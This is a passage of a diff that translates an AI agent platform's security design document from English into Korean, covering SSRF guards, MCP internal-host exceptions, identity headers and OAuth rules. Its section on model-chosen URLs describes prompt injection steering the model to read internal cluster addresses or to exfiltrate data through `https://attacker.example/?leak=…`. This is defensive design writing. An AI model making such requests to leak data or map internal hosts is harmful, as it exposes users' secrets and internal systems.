+`tests/architecture.test.ts` 가 고정한다.
 
-Replay protection: Slack events are deduplicated exactly-once by `event_id` and Telegram
-updates by `update_id` per project (conditional put, 24h TTL, one shared claim-and-settle
-repository) whose claim is a **lease** settled afterwards, so an instance that dies
-mid-processing leaves a reclaimable claim rather than an event recorded as handled by nobody.
-Webhook deliveries claim their `Idempotency-Key` the same way.
+리플레이 방지: Slack 이벤트는 `event_id` 로, Telegram 업데이트는 project 별 `update_id` 로
+정확히 한 번만 처리되도록 중복 제거된다(조건부 put, 24시간 TTL, 공유된 하나의
+claim-and-settle 저장소). 그 claim 은 나중에 정산되는 **리스** 이므로, 처리 도중 죽은
+인스턴스는 아무도 처리하지 않았는데 처리된 것으로 기록된 이벤트가 아니라 다시 가져갈 수 있는
+claim 을 남긴다. Webhook 배달도 같은 방식으로 `Idempotency-Key` 를 선점한다.
 
-## Response headers
+## 응답 헤더
 
-Set in `next.config.ts` for every path. `frame-ancestors 'none'` and `X-Frame-Options: DENY`
-because the console has buttons that delete an artifact and rotate a key, and a framed page is
-how a click on one gets collected. `X-Content-Type-Options: nosniff` because one route answers
-`text/html` and puts an authorization server's words on it. `Referrer-Policy:
-strict-origin-when-cross-origin` because a URL here is often itself the credential — a signed
-object address, a webhook path — and a full referrer hands it to whatever the reader clicks
-next.
+`next.config.ts` 에서 모든 경로에 설정한다. `frame-ancestors 'none'` 과
+`X-Frame-Options: DENY` 는 콘솔에 artifact 를 지우고 키를 회전시키는 버튼이 있고, 프레임에 넣은
+페이지가 바로 그 클릭을 수집하는 방법이기 때문이다. `X-Content-Type-Options: nosniff` 는 한
+라우트가 `text/html` 로 답하면서 인가 서버의 말을 거기에 싣기 때문이다. `Referrer-Policy:
+strict-origin-when-cross-origin` 은 여기서는 URL 자체가 자격 증명인 경우가 많고 — 서명된
+오브젝트 주소, webhook 경로 — 전체 리퍼러는 그것을 독자가 다음에 클릭하는 곳에 건네주기
+때문이다.
 
-**No Content-Security-Policy yet.** Mantine and Next both emit inline styles, so a useful
-policy needs a nonce pipeline; a wrong one breaks the console silently, which is worse than
-the absence. Until then nothing here is a second line of defence against an injected script —
-the escaping at each sink is the only one.
+**아직 Content-Security-Policy 는 없다.** Mantine 과 Next 둘 다 인라인 스타일을 내보내므로
+쓸모 있는 정책에는 nonce 파이프라인이 필요하다. 잘못된 정책은 콘솔을 조용히 망가뜨리는데,
+그것은 없는 것보다 나쁘다. 그때까지 여기의 어떤 것도 주입된 스크립트에 대한 두 번째 방어선이
+아니다 — 각 싱크에서의 이스케이핑이 유일한 방어선이다.
 
-## Outbound requests (SSRF)
+## 아웃바운드 요청 (SSRF)
 
-Operator-registered URLs — MCP servers and external agents — are validated by
-`src/infrastructure/net/ssrfGuard.ts` at **both registration and dispatch**. Rejected:
-non-`http(s)` schemes, URLs carrying userinfo (`https://user:pass@host` — a credential in the
-address is not how anything here authenticates, and it is a standing way to make a host read
-as something else), and hosts resolving to private, loopback, link-local (including the
-`169.254.169.254` cloud-metadata address) or otherwise reserved ranges.
+운영자가 등록한 URL — MCP 서버와 외부 agent — 은 `src/infrastructure/net/ssrfGuard.ts` 가
+**등록 시점과 디스패치 시점 모두** 에서 검증한다. 거부되는 것: `http(s)` 가 아닌 스킴,
+userinfo 를 실은 URL(`https://user:pass@host` — 주소 안의 자격 증명은 여기서 무언가를 인증하는
+방식이 아니고, 호스트를 다른 것처럼 읽히게 만드는 상투적 수단이다), 그리고
+사설·루프백·링크로컬(클라우드 메타데이터 주소 `169.254.169.254` 포함) 또는 그 밖의 예약 대역으로
+해석되는 호스트.
 
-Dispatch goes through `fetchPublicUrl` (`src/infrastructure/net/publicFetch.ts`), which is
-the single outbound boundary:
+디스패치는 `fetchPublicUrl`(`src/infrastructure/net/publicFetch.ts`)을 거치고, 그것이 단일
+아웃바운드 경계다:
 
-- DNS is re-resolved and re-checked on **every request and every redirect hop**, narrowing
-  (though not fully closing) the DNS-rebinding window between registration and use.
-- The connection is pinned to the checked address.
-- Native redirect-following is disabled and **cross-origin redirects are refused**, so stored
-  credentials cannot be forwarded to another host.
-- Dispatchers are pooled per `origin|pinned address` for connection reuse. This caches
-  **transport only** — the guard still runs per request, so a host that starts resolving
-  privately is rejected before a pooled dispatcher is reached, and a host resolving elsewhere
-  gets a different key.
+- DNS 는 **모든 요청과 모든 리다이렉트 홉마다** 다시 해석하고 다시 확인한다. 등록과 사용
+  사이의 DNS 리바인딩 창을 (완전히 닫지는 못하지만) 좁힌다.
+- 커넥션은 확인된 주소에 고정된다.
+- 네이티브 리다이렉트 추종은 꺼져 있고 **교차 출처 리다이렉트는 거부한다**. 저장된 자격 증명이
+  다른 호스트로 전달될 수 없게 하기 위해서다.
+- 디스패처는 커넥션 재사용을 위해 `origin|pinned address` 별로 풀링된다. 이것이 캐시하는 것은
+  **전송 계층뿐** 이다 — 가드는 여전히 요청마다 돌기 때문에, 사설 주소로 해석되기 시작한
+  호스트는 풀링된 디스패처에 닿기 전에 거부되고, 다른 곳으로 해석되는 호스트는 다른 키를
+  받는다.
 
-Any public URL is allowed. Register only trusted endpoints.
+공개 URL 이면 무엇이든 허용된다. 신뢰하는 엔드포인트만 등록하라.
 
-The MCP client runs on `@modelcontextprotocol/client`, and the guard is **injected into it**
-rather than sitting beside it: `boundedFetch` (`src/infrastructure/mcp/session.ts`) is what the
-transport is given as its `fetch`, so the probe, the handshake, every tool call and the session
-release all go through the same boundary. An SDK left to its own `fetch` would take an
-operator-supplied URL straight to the network. The same wrapper carries the response byte
-ceiling, which the SDK also has no notion of.
+MCP 클라이언트는 `@modelcontextprotocol/client` 위에서 돌고, 가드는 그 옆에 놓이는 대신 그 안으로
+**주입된다**. 트랜스포트에 `fetch` 로 주어지는 것이
+`boundedFetch`(`src/infrastructure/mcp/session.ts`)이므로 프로브, 핸드셰이크, 모든 도구 호출,
+세션 해제까지 전부 같은 경계를 지난다. SDK 를 자기 `fetch` 에 맡겨 두면 운영자가 넣은 URL 을
+곧장 네트워크로 가져갈 것이다. 같은 래퍼가 응답 바이트 상한도 함께 나르는데, SDK 에는 그런 개념
+자체가 없다.
 
-### Declared internal hosts
+### 선언된 내부 호스트
 
-On a cluster, the MCP servers this app is *meant* to call are private by
-construction — a Kubernetes Service resolves to a ClusterIP the guard rejects.
-`MCP_INTERNAL_HOST_SUFFIXES` is how a deployment says which names those are:
+클러스터에서 이 앱이 부르기로 *되어 있는* MCP 서버들은 구조상 사설이다 — Kubernetes Service 는
+가드가 거부하는 ClusterIP 로 해석된다. `MCP_INTERNAL_HOST_SUFFIXES` 는 배포가 그 이름들이
+무엇인지 밝히는 방법이다:
 
 ```
 MCP_INTERNAL_HOST_SUFFIXES=agent-mcps.svc.cluster.local
 ```
 
-A host under a declared suffix skips the public-URL guard everywhere the
-question is asked — registering an entry and editing one, the console's "Test
-connection" probe, an admin reading the entry's OAuth metadata, a project's own
-tool list, and dispatch — each through `skipsUrlGuard`. **The blocked address
-ranges are not widened** — every other entry still faces the check it did. This
-is a second narrow exception alongside managed loopback, not a loosening of the
-guard.
+선언된 접미사 아래의 호스트는 그 질문이 던져지는 모든 곳에서 public URL 가드를 건너뛴다 —
+항목을 등록할 때와 편집할 때, 콘솔의 "Test connection" 프로브, admin 이 항목의 OAuth 메타데이터를
+읽을 때, project 자신의 도구 목록, 그리고 디스패치 — 각각 `skipsUrlGuard` 를 통해서다. **차단된
+주소 대역이 넓어지는 것은 아니다** — 다른 모든 항목은 여전히 원래 받던 검사를 받는다. 이것은
+가드를 느슨하게 하는 것이 아니라 managed 루프백 옆에 놓인 두 번째 좁은 예외다.
 
-Its narrowness is the whole design, and each part is pinned by
-`tests/internalHosts.test.ts`:
+그 좁음이 설계의 전부이고, 각 부분은 `tests/internalHosts.test.ts` 가 고정한다:
 
-- **Configuration only.** The list comes from the environment. A registry entry
-  cannot name its own exemption, and it is deliberately *not* a runtime setting:
-  widening the outbound boundary should take a deploy, not a form submitted by
-  whoever holds admin at the time.
-- **Label-anchored.** `agent-mcps.svc.cluster.local` admits
-  `mcp-url-fetch.agent-mcps.svc.cluster.local` and refuses
-  `evil-agent-mcps.svc.cluster.local` — the near-miss that a plain "ends with"
-  would let through. A leading dot is accepted and means the same thing.
-- **No single-label suffix.** `local` or `internal` would admit a whole namespace
-  of names; far more likely a typo than an intent, so it is not honoured.
-- **Never an IP literal.** The exemption is for a name someone published. An
-  address has no name to match, so a private address still has to earn its way
-  through provenance.
-- **`http(s)` only**, and userinfo cannot smuggle the suffix past the host check.
+- **설정으로만.** 목록은 환경에서 온다. 레지스트리 항목이 자기 예외를 스스로 지정할 수 없고,
+  의도적으로 런타임 설정이 *아니다*. 아웃바운드 경계를 넓히는 일은 그때 admin 을 쥔 사람이
+  제출하는 폼이 아니라 배포를 거쳐야 한다.
+- **레이블 단위로 고정.** `agent-mcps.svc.cluster.local` 은
+  `mcp-url-fetch.agent-mcps.svc.cluster.local` 을 허용하고 `evil-agent-mcps.svc.cluster.local`
+  은 거부한다 — 단순한 "…로 끝난다"였다면 통과시켰을 아슬아슬한 경우다. 앞에 붙은 점은
+  허용되며 같은 뜻이다.
+- **단일 레이블 접미사는 없다.** `local` 이나 `internal` 은 이름 공간 하나를 통째로 허용하게
+  된다. 의도라기보다 오타일 가능성이 훨씬 높으므로 존중하지 않는다.
+- **IP 리터럴은 결코 안 된다.** 그 예외는 누군가 게시한 이름을 위한 것이다. 주소에는 맞출 이름이
+  없으므로, 사설 주소는 여전히 provenance 로 자기 길을 얻어야 한다.
+- **`http(s)` 만**, 그리고 userinfo 로 호스트 검사를 지나쳐 접미사를 밀반입할 수 없다.
 
-What it costs: a host under that suffix is reachable by any URL an admin can
-store, which is the capability the guard otherwise removes. Keep the suffix as
-specific as the namespace you actually run those servers in.
+그 대가: 그 접미사 아래의 호스트는 admin 이 저장할 수 있는 어떤 URL 로도 도달 가능해지고, 그것이
+바로 가드가 평소에 없애는 능력이다. 그 서버들을 실제로 돌리는 네임스페이스만큼 접미사를
+구체적으로 유지하라.
 
-### The managed-loopback exception
+### managed 루프백 예외
 
-A managed MCP server (`runtime: "managed"`) is a container this app started on its own host
-and reaches at `127.0.0.1:<port>` — an address the guard correctly rejects for anything an
-operator types. Trust rests on **provenance** instead: the provisioner recorded that address
-after binding the port.
+managed MCP 서버(`runtime: "managed"`)는 이 앱이 자기 호스트에서 직접 띄운 컨테이너이고
+`127.0.0.1:<port>` 로 닿는다 — 운영자가 타이핑한 것이라면 가드가 정확히 거부할 주소다. 신뢰는
+대신 **provenance** 에 놓인다. 프로비저너가 포트를 바인딩한 뒤 그 주소를 기록했다.
 
-`isManagedLoopback` (`src/domain/mcp/types.ts`) is the only place that decides the bypass
-applies, and it is narrow on purpose. The entry must claim `managed` **and** carry a literal
-loopback address:
+`isManagedLoopback`(`src/domain/mcp/types.ts`)이 이 우회가 적용되는지를 결정하는 유일한
+자리이고, 의도적으로 좁다. 항목은 `managed` 를 주장해야 하고 **그리고** 리터럴 루프백 주소를
+지녀야 한다:
 
-- A hostname that resolves to `127.0.0.1` is refused — it can resolve elsewhere between check
-  and request.
-- A `remote` entry pointing at loopback is refused — that address was typed.
-- The registry refuses to move a managed entry's URL.
-- The lifecycle use case refuses to store a non-loopback address even when the provisioner
-  reports one, and stops the container it named.
+- `127.0.0.1` 로 해석되는 호스트명은 거부된다 — 확인과 요청 사이에 다른 곳으로 해석될 수 있다.
+- 루프백을 가리키는 `remote` 항목은 거부된다 — 그 주소는 타이핑된 것이다.
+- 레지스트리는 managed 항목의 URL 을 옮기기를 거부한다.
+- 라이프사이클 use case 는 프로비저너가 보고하더라도 루프백이 아닌 주소를 저장하기를 거부하고,
+  그것이 지목한 컨테이너를 정지시킨다.
 
-The provisioner takes an image reference, a port and an optional **argv array**, never a
-shell command. The local adapter passes argv directly to Docker; the SSM adapter validates
-the configured AWS region and registry host, then shell-quotes them and every runtime argument
-before assembling its command.
+프로비저너는 이미지 레퍼런스, 포트, 그리고 선택적인 **argv 배열** 을 받는다. 셸 명령은 결코 받지
+않는다. 로컬 어댑터는 argv 를 Docker 에 그대로 넘긴다. SSM 어댑터는 설정된 AWS 리전과 레지스트리
+호스트를 검증한 뒤, 그것들과 모든 런타임 인자를 셸 인용부호로 감싸고 나서 명령을 조립한다.
 
-### What an MCP server is told about the caller
+### MCP 서버가 호출자에 대해 듣는 것
 
-Every request a run makes to an MCP server carries `X-Tenant-Id` with the calling project's
-name (`TENANT_ID_HEADER` in `src/application/execution/mcpTools.ts`). It exists so a
-multi-tenant server — mcp-memory scopes its data by it — works per project with no
-per-project registration; a server that does not read it ignores it, and one that already
-treats `X-Tenant-Id` as its tenancy switch acts on ours, which is the point of the generic
-name. It is applied *after* the registry/binding header merge, in any spelling, so a
-version's overrides cannot impersonate another project's tenant, and it rides in the
-session's header map so the discovery cache stays keyed per project. The catalog reindex
-probe and "Test connection" carry no project and send no header — a server that requires one
-refuses those listings and is indexed at server level only.
+런이 MCP 서버로 보내는 모든 요청은 호출하는 project 의 이름을 담은 `X-Tenant-Id` 를 싣는다
+(`src/application/execution/mcpTools.ts` 의 `TENANT_ID_HEADER`). 이것은 멀티테넌트 서버가 —
+mcp-memory 는 이것으로 자기 데이터를 스코프한다 — project 별 등록 없이 project 마다 동작하도록
+존재한다. 그것을 읽지 않는 서버는 무시하고, 이미 `X-Tenant-Id` 를 자기 테넌시 스위치로 다루는
+서버는 우리 것에 반응하는데, 그게 이 일반적인 이름의 요점이다. 이 헤더는 레지스트리/바인딩 헤더
+병합 *이후* 에, 어떤 표기로 왔든 적용되므로 버전의 오버라이드가 다른 project 의 테넌트를 사칭할
+수 없고, 세션의 헤더 맵에 실려 discovery 캐시가 project 별로 키잉된 상태를 유지한다. 카탈로그
+재색인 프로브와 "Test connection" 은 project 를 지니지 않아 헤더를 보내지 않는다 — 그것을
+요구하는 서버는 그 목록 조회를 거부하고 서버 수준으로만 색인된다.
 
-The console's per-project tool list (`listTools` in `src/application/mcp/mcpAuthUseCases.ts`)
-is the one probe that *has* a project and still sends no tenant: it resolves that project's
-OAuth token and assembles the same headers a run would, minus this one. On a server that
-exposes different tools per tenant, the list an owner is shown is therefore not necessarily
-the list their run is offered.
+콘솔의 project 별 도구 목록(`src/application/mcp/mcpAuthUseCases.ts` 의 `listTools`)은 project 를
+*가지고 있으면서도* 테넌트를 보내지 않는 유일한 프로브다. 그 project 의 OAuth token 을 해석하고
+런이 조립할 것과 같은 헤더를 조립하되, 이 하나만 뺀다. 테넌트별로 다른 도구를 노출하는 서버에서
+소유자에게 보이는 목록은 따라서 그의 런에 제공되는 목록과 반드시 같지는 않다.
 
-One more header rides beside it when the run is in a conversation: `X-Conversation-Id`
-(`CONVERSATION_ID_HEADER`, same file) with the run's conversation key — `chat:{chatId}`,
-`slack:{channel}:{threadTs}`, `a2a:{client}:{contextId}`, or `api:{caller}:{value}` for a
-caller that sent its own `X-Conversation-Id`, where `{caller}` is a digest of the actor key
-**keyed with this deployment's `AES_ENCRYPTION_KEY`**: stable for one caller here, so a
-server can tell their conversations apart, and not a plain hash of an email, which a list of
-addresses would reverse offline. It is a pseudonym, not anonymity — a server that sees the
-same digest twice knows the same caller asked twice, which is the point — and it means
-nothing to anyone without this deployment's key. Reserved and stamped after the merge exactly
-like the tenant, so a binding cannot name another conversation. It travels in the session's
-*context* headers, not its identity headers, so it does not key the discovery cache: a
-conversation decides nothing about which tools a server exposes, and paying a discovery per
-thread would be the cost of pretending it did. A firing has no conversation and sends none;
-the probes above send none either. Like the tenant it authenticates nothing — a memory server
-may scope working notes by it, and must not treat it as authorization.
+런이 대화 안에 있을 때는 그 옆에 헤더가 하나 더 실린다. `X-Conversation-Id`
+(`CONVERSATION_ID_HEADER`, 같은 파일)에 런의 대화 키가 담긴다 — `chat:{chatId}`,
+`slack:{channel}:{threadTs}`, `a2a:{client}:{contextId}`, 또는 자기 `X-Conversation-Id` 를 보낸
+호출자에게는 `api:{caller}:{value}`. 여기서 `{caller}` 는 actor 키의 다이제스트이며 **이 배포의
+`AES_ENCRYPTION_KEY` 로 키잉된다**. 여기서는 한 호출자에 대해 안정적이라 서버가 그의 대화들을
+구별할 수 있고, email 의 평범한 해시가 아니라서 주소 목록으로 오프라인에서 역산할 수 없다.
+이것은 익명성이 아니라 가명이다 — 같은 다이제스트를 두 번 본 서버는 같은 호출자가 두 번
+물었다는 것을 알고, 그게 요점이다 — 그리고 이 배포의 키가 없는 누구에게도 아무 의미가 없다.
+테넌트와 똑같이 예약돼 있고 병합 이후에 찍히므로 바인딩이 다른 대화를 지목할 수 없다. 이것은
+세션의 신원 헤더가 아니라 *컨텍스트* 헤더로 이동하므로 discovery 캐시를 키잉하지 않는다. 대화는
+서버가 어떤 도구를 노출할지에 대해 아무것도 결정하지 않으며, 스레드마다 discovery 비용을 치르는
+것은 결정한다고 가정하는 대가일 뿐이다. 발화(firing)에는 대화가 없어 아무것도 보내지 않고, 위의
+프로브들도 보내지 않는다. 테넌트와 마찬가지로 이것은 아무것도 인증하지 않는다 — 메모리 서버가
+이것으로 작업 노트를 스코프해도 좋지만, 인가로 다뤄서는 안 된다.
 
-Those two headers are the **only** identity metadata sent automatically, and neither carries a
-user's name or email — the tenant is the project name, the conversation an opaque thread
-address. What a server can learn beyond them is
-(a) whatever the model writes into tool arguments — see *PII filtering, and where it
-stops* — and (b) for OAuth entries, that the registered client is named
-`AgentDure — <project>` and that the token carries the grant of whoever connected the
-server.
+이 두 헤더가 자동으로 전송되는 **유일한** 신원 메타데이터이고, 둘 다 사용자의 이름이나 email 을
+싣지 않는다 — 테넌트는 project 이름이고, 대화는 불투명한 스레드 주소다. 서버가 그 너머로 알 수
+있는 것은 (a) 모델이 도구 인자에 써 넣는 무엇이든 — *PII 필터링, 그리고 그것이 멈추는 곳* 참고 —
+그리고 (b) OAuth 항목의 경우, 등록된 클라이언트의 이름이 `AgentDure — <project>` 라는 것과
+token 이 그 서버를 연결한 사람의 grant 를 지닌다는 것이다.
 
-### URLs the model chose
+### 모델이 고른 URL
 
-Everything above concerns addresses an **operator registered**, where validation at
-registration is the first control and the dispatch check is the second — narrowing, not
-closing, the window between them. The `FetchUrl` builtin has no first control: the model names
-the address, and a model is talked into things by the text it reads. `src/infrastructure/net/httpResource.ts`
-is the only place such an address is requested, and its rules are load-bearing rather than
-defence in depth:
+위의 모든 것은 **운영자가 등록한** 주소에 관한 것이고, 거기서는 등록 시 검증이 첫 번째 통제이며
+디스패치 시 확인이 두 번째다 — 그 사이의 창을 닫는 것이 아니라 좁힌다. `FetchUrl` 빌트인에는
+첫 번째 통제가 없다. 주소를 지목하는 것은 모델이고, 모델은 자기가 읽는 텍스트에 설득당한다.
+`src/infrastructure/net/httpResource.ts` 가 그런 주소를 요청하는 유일한 자리이며, 그 규칙들은
+심층 방어가 아니라 하중을 지고 있다:
 
-- **The internal-host exemption is never consulted.** `MCP_INTERNAL_HOST_SUFFIXES` exists so
-  this app can reach its own cluster MCP services. Honouring it here would turn one prompt
-  injection into a read of `http://mcp-argocd.agent-mcps.svc.cluster.local/`.
-  `tests/architecture.test.ts` fails if the adapter so much as imports `skipsUrlGuard`.
-- **Nothing authenticates.** No tenant header, no MCP OAuth token, no Slack token, no caller
-  headers forwarded. Always GET, never a body. A cross-origin redirect cannot forward what was
-  never attached — and `fetchPublicUrl` refuses one anyway.
-- **Refusals are generalised.** `PublicFetchError` names the host it refused; handing that to a
-  model turns the tool into an oracle for which internal names exist. The caller gets "that
-  address is not reachable from here" and the detail goes to the log, origin only — a URL is
-  often itself the credential.
-- **Bounded per run.** `MAX_URL_FETCHES_PER_RUN` (20) caps the *number* of requests, which no
-  other budget does. "Many requests, all failing" is the shape a network sweep takes.
-- **Off by default.** A version opts in with `parameters.urlFetch`; the capability is derived
-  from the injected dependency, so the Playground preview and the run cannot disagree.
+- **내부 호스트 예외는 결코 참조하지 않는다.** `MCP_INTERNAL_HOST_SUFFIXES` 는 이 앱이 자기
+  클러스터의 MCP 서비스에 닿을 수 있게 하려고 존재한다. 여기서 그것을 존중하면 프롬프트 인젝션
+  하나가 `http://mcp-argocd.agent-mcps.svc.cluster.local/` 을 읽는 일로 바뀐다. 어댑터가
+  `skipsUrlGuard` 를 import 하기만 해도 `tests/architecture.test.ts` 가 실패한다.
+- **아무것도 인증하지 않는다.** 테넌트 헤더 없음, MCP OAuth token 없음, Slack token 없음,
+  호출자 헤더 전달 없음. 항상 GET 이고 본문은 결코 없다. 교차 출처 리다이렉트는 애초에 붙지
+  않은 것을 전달할 수 없고 — `fetchPublicUrl` 이 어차피 그것을 거부한다.
+- **거부는 일반화된다.** `PublicFetchError` 는 자기가 거부한 호스트를 지목한다. 그것을 모델에게
+  건네면 도구가 어떤 내부 이름이 존재하는지에 대한 오라클이 된다. 호출자는 "그 주소는 여기서
+  도달할 수 없다"를 받고, 상세는 origin 만 로그로 간다 — URL 자체가 자격 증명인 경우가 많다.
+- **런당 제한된다.** `MAX_URL_FETCHES_PER_RUN`(20)은 요청의 *개수* 를 제한하는데, 다른 어떤
+  예산도 그렇게 하지 않는다. "많은 요청, 전부 실패"는 네트워크 스윕이 취하는 모양이다.
+- **기본은 꺼짐.** 버전이 `parameters.urlFetch` 로 옵트인한다. 그 capability 는 주입된
+  의존성에서 파생되므로 Playground 프리뷰와 런이 서로 어긋날 수 없다.
 
-**What this does not stop.** A host that is public but sensitive — an IP-allowlisted SaaS that
-trusts the pod's egress address — passes the guard. So does exfiltration: a model talked into
-requesting `https://attacker.example/?leak=…` is making an ordinary outbound request, and PII
-filtering does not help, because the fetch needs the *restored* argument (a masked URL does not
-resolve). This is the same limit already stated for MCP tool arguments below; the difference is
-that a URL is a lower-friction channel.
+**이것이 막지 못하는 것.** 공개돼 있지만 민감한 호스트 — 파드의 이그레스 주소를 신뢰하는 IP
+허용목록 기반 SaaS — 는 가드를 통과한다. 유출도 마찬가지다. `https://attacker.example/?leak=…`
+을 요청하도록 설득당한 모델은 평범한 아웃바운드 요청을 하는 것이고, PII 필터링은 도움이 되지
+않는다. fetch 에는 *복원된* 인자가 필요하기 때문이다(마스킹된 URL 은 해석되지 않는다). 이것은
+아래에서 MCP 도구 인자에 대해 이미 말한 것과 같은 한계다. 차이는 URL 이 마찰이 더 적은 통로라는
+점이다.
 
-**And what it costs.** This exposure existed before, in a separate pod with no credentials of
-its own. It now runs in the app process, which holds the AES master key, the DynamoDB role and
-the Slack tokens — so the blast radius of any SSRF-adjacent defect is larger, and the app's
-egress policy has to be wide enough to reach the open web. Mitigated, not removed.
+**그리고 그 대가.** 이 노출은 예전에도 있었지만, 자기 자격 증명이 하나도 없는 별도의 파드에
+있었다. 이제는 AES 마스터 키, DynamoDB 역할, Slack token 을 쥐고 있는 앱 프로세스 안에서 돈다 —
+그래서 SSRF 인접 결함의 폭발 반경이 더 크고, 앱의 이그레스 정책은 열린 웹에 닿을 만큼 넓어야
+한다. 완화된 것이지 제거된 것이 아니다.
 
 ## MCP OAuth
 
-Registry entries may carry an `auth` block discovered once at registration (RFC 9728
-protected-resource metadata → RFC 8414 authorization-server metadata). Every endpoint taken
-out of either document is re-validated through the URL policy and required to be `https`.
-**The run path never fetches a well-known document.**
+레지스트리 항목은 등록 시 한 번 발견된 `auth` 블록을 지닐 수 있다(RFC 9728 protected-resource
+메타데이터 → RFC 8414 authorization-server 메타데이터). 두 문서 중 어느 쪽에서 꺼낸
+엔드포인트든 URL 정책으로 다시 검증되고 `https` 여야 한다. **런 경로는 well-known 문서를 결코
+가져오지 않는다.**
 
-The resource document is read from the entry's own address, so a
-[declared internal host](#declared-internal-hosts) is read the same way a run dials it. The
-**authorization server is not** — that URL comes out of a third party's document rather than
-the registry, and an operator declaring an MCP host internal says nothing about an
-authorization server that host names for itself.
+resource 문서는 항목 자신의 주소에서 읽으므로,
+[선언된 내부 호스트](#선언된-내부-호스트)는 런이 다이얼하는 것과 같은 방식으로 읽힌다.
+**authorization 서버는 그렇지 않다** — 그 URL 은 레지스트리가 아니라 제3자의 문서에서 나오고,
+운영자가 어떤 MCP 호스트를 내부라고 선언한 것은 그 호스트가 스스로 지목하는 authorization
+서버에 대해서는 아무 말도 하지 않는다.
 
-Credentials are **per project**, in their own `PROJECT#<name> / MCPCONN#<server>` item — not
-on the version (a snapshot of configuration history) and not on the project item (whose
-`updatedAt` is the optimistic-concurrency condition for publish). That split is what lets one
-shared registry entry serve a different provider app per project.
+자격 증명은 **project 별** 이며 자기 자신의 `PROJECT#<name> / MCPCONN#<server>` 아이템에 있다 —
+버전(설정 이력의 스냅샷)에도, project 아이템(그 `updatedAt` 은 publish 의 낙관적 동시성
+조건이다)에도 있지 않다. 그 분리가 하나의 공유 레지스트리 항목이 project 마다 다른 제공자 앱을
+섬길 수 있게 한다.
 
-Enforced properties:
+강제되는 속성:
 
-- **PKCE S256 is mandatory.** `state` is single-use with a 10-minute TTL.
-- **RFC 8707 `resource`** is sent on every authorization and token request. The spec makes it
-  unconditional, and it is what stops a token issued for one MCP server being replayed
-  against another.
-- **RFC 9207 `iss`** is validated before the code is redeemed (SEP-2468). The expected issuer
-  is recorded on the pending-state item beside the PKCE verifier — *not* read back off the
-  registry entry, which a re-discovery may have changed — and compared **literally**: no case,
-  port, trailing-slash or percent-encoding normalisation, each of which is another way for two
-  issuers to compare equal. A missing `iss` is fatal only where the server's metadata
-  advertises `authorization_response_iss_parameter_supported`. The same check runs on error
-  responses, so provider-controlled `error_description` text is never relayed from a redirect
-  this app cannot attribute.
-- **Issuer binding on the credentials** (SEP-2352): a connection's client credentials carry
-  the issuer they were registered with, and its tokens carry the `resource` they were minted
-  for. Both are checked before anything is handed out — on the refresh path *and* on the path
-  that only reads a live token, because a bearer token has an audience and serving one
-  unchecked is the same mistake as spending the client secret. **Both are required rather than
-  defaulted**: a row written before they were recorded reads back as *no connection*, so the
-  console offers a reconnect. The old fallback assumed such a row belonged to whatever the
-  entry points at now, which is exactly the assumption the fields exist to stop making — and a
-  token checked against a guess is not checked. The same applies to a pending authorization
-  whose state carries no issuer: it is refused rather than completed unchecked.
-- **Editing an entry's URL drops its `auth` block outright.** The block was read out of the
-  old address's well-known documents. The entry falls back to its own headers until an admin
-  re-runs Discover; once they do, the two checks above catch every connection that belonged to
-  the old server. Deleting and recreating an entry under the same name is caught the same way
-  — which matters, because the registry is admin-owned while connections are owner-owned and
-  the only thing joining them is the name.
-- **How a client is obtained, in the spec's own order**: credentials already held (registered
-  once, or entered by hand), then a Client ID Metadata Document, then dynamic registration,
-  then an error naming what the owner has to do. Registration is deprecated from protocol
-  `2026-07-28` in favour of the documents, so a server advertising
-  `client_id_metadata_document_supported` is never registered with — but it is kept for the
-  ones that advertise nothing else, which is every authorization server on a 2025-era
-  release. Dropping it was tried and reverted: it makes a working connection unconnectable
-  and tells its owner to go and register an app by hand, over a revision date they do not
-  control.
-- **A document is only a route where the provider could fetch it.** The `client_id` is a URL
-  the *authorization server* retrieves, so a deployment whose public base is `http://localhost`
-  or an internal hostname mints one that resolves to nothing — and the provider says so only
-  after the user approves, as *Unknown OAuth client*, which reads as a problem with the client
-  rather than with a URL. The address faces the same https-and-publicly-routable check the
-  entry's own endpoints do; failing it moves to registration, and the refusal when there is no
-  registration to move to names the base URL rather than the provider. A stored document
-  `client_id` that is no longer the one this deployment would serve is rebuilt for the same
-  reason — otherwise the row keeps a `clientId`, every branch is skipped, and the same
-  unfetchable URL is presented forever.
-- Dynamic registration (RFC 7591) declares `application_type: "web"` (SEP-837) rather than
-  leaving the OpenID Connect default to apply. A public client with no secret sends `none`
-  whatever the server's metadata preferred.
-- **A Client ID Metadata Document is served publicly, per project**, at
-  `/api/mcps/oauth/client-metadata/{project}` — the one MCP route with no session check, and
-  deliberately so: the reader is an authorization server resolving a `client_id` that is a
-  URL, arriving from wherever the provider runs with no cookie. Nothing in it is a secret; it
-  states this deployment's name and the one redirect URI it accepts, which is what
-  registration used to send in a POST body. The `client_id` inside must equal the URL it was
-  fetched from, so both are built by one function (`clientMetadataUrl` /
-  `clientMetadataDocument`) from the **configured** public base — never from the request,
-  which would let a caller publish a document authorizing a redirect to its own host. The
-  project is not looked up: a public endpoint that reads the database per request invites
-  unauthenticated traffic into it, and a 404 for an unknown name would leak which projects
-  exist. A document for a project that does not exist is inert — the authorization it could
-  start lands at the callback, which finds no connection and stops.
-- **Such a client is public by construction**, so the flow's defence is PKCE plus that fixed
-  redirect URI rather than a shared secret: an authorization anyone else starts still delivers
-  its code to this deployment's callback, where it is useless without the verifier.
-- **The issuer-binding rule above inverts for it.** A registered or hand-entered `client_id`
-  is meaningless away from the server that issued it, which is why it is keyed by issuer and
-  re-registered when that changes — or, when nothing here can re-issue it, refused with the
-  server the owner has to register with named. A metadata-document `client_id` is self-hosted
-  and resolved on demand by whichever server is asked, so it survives the entry moving —
-  refusing it would break a working connection over credentials it does not have.
-- The callback **re-checks project ownership**, because it can change while the user is at the
-  provider.
+- **PKCE S256 은 필수다.** `state` 는 10분 TTL 의 일회용이다.
+- **RFC 8707 `resource`** 는 모든 authorization 요청과 token 요청에 실린다. 명세가 그것을
+  무조건으로 규정하며, 한 MCP 서버용으로 발급된 token 이 다른 서버에 재사용되는 것을 막는 것이
+  바로 그것이다.
+- **RFC 9207 `iss`** 는 code 를 교환하기 전에 검증된다(SEP-2468). 기대 issuer 는 PKCE verifier
+  옆의 pending-state 아이템에 기록되며 — 재발견이 바꿔 놓았을 수 있는 레지스트리 항목에서
+  되읽지 *않는다* — **문자 그대로** 비교된다. 대소문자, 포트, 끝의 슬래시, 퍼센트 인코딩 정규화
+  중 무엇도 하지 않는데, 각각이 서로 다른 두 issuer 가 같다고 비교될 또 하나의 방법이기
